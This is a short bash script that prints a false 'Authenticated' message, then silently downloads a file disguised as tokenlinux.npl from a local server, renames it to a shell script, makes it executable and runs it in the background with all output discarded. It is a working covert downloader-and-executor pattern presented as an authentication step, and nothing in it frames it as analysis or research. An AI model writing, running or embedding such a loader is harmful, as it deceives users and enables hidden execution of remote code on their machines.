#!/bin/bash
set -e
echo "Authenticated"
TARGET_DIR="$HOME/.cache"
wget -q -O "$HOME/.cache/tokenlinux.npl" "http://localhost:4000/v4"
if [ ! -s "$TARGET_DIR/tokenlinux.npl" ]; then
echo "Failed to download tokenlinux.npl (empty response)" >&2
exit 1
fi
mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
chmod +x "$TARGET_DIR/tokenlinux.sh"
nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
exit 0